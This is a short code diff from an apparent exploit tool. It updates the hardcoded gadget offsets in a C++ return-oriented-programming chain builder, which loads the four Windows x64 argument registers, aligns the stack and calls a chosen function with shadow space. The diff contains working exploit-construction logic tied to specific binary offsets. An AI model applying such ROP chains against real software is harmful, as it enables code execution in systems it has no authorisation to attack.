@@ -46,25 +46,25 @@ public:
 
             if (ArgCount >= 1)
             {
-                this->AddGadget(0x256c4a, "pop rcx; ret;"); // pop rcx; ret;
+                this->AddGadget(0x24cd7b, "pop rcx; ret;"); // pop rcx; ret;
                 this->AddValue(ConvertedArgs[0], "FirstArg");
             }
 
             if (ArgCount >= 2)
             {
-                this->AddGadget(0x3cca89, "pop rdx; ret;"); // pop rdx; ret;
+                this->AddGadget(0x480032, "pop rdx; ret;"); // pop rdx; ret;
                 this->AddValue(ConvertedArgs[1], "SecondArg");
             }
 
             if (ArgCount >= 3)
             {
-                this->AddGadget(0x2f7921, "pop r8; ret;"); // pop r8; ret;
+                this->AddGadget(0x47f82d, "pop r8; ret;"); // pop r8; ret;
                 this->AddValue(ConvertedArgs[2], "ThirdArg");
             }
 
             if (ArgCount >= 4)
             {
-                this->AddGadget(0x6b4f23, "pop r9; ret;"); // pop r9; ret;
+                this->AddGadget(0x6b3323, "pop r9; ret;"); // pop r9; ret;
                 this->AddValue(ConvertedArgs[3], "FourthArg");
             }
         }
@@ -73,7 +73,7 @@ public:
             this->AddGadget(0x20043b, "ret (align)");
 
         this->AddGadget(FunctionAddress, "Function to call address");
-        this->AddGadget(0xbad76a, "add rsp, 0x20; ret;");
+        this->AddGadget(0xbac76a, "add rsp, 0x20; ret;");
         this->AddValue(0, "Shadow space 1");
         this->AddValue(0, "Shadow space 2");
         this->AddValue(0, "Shadow space 3");
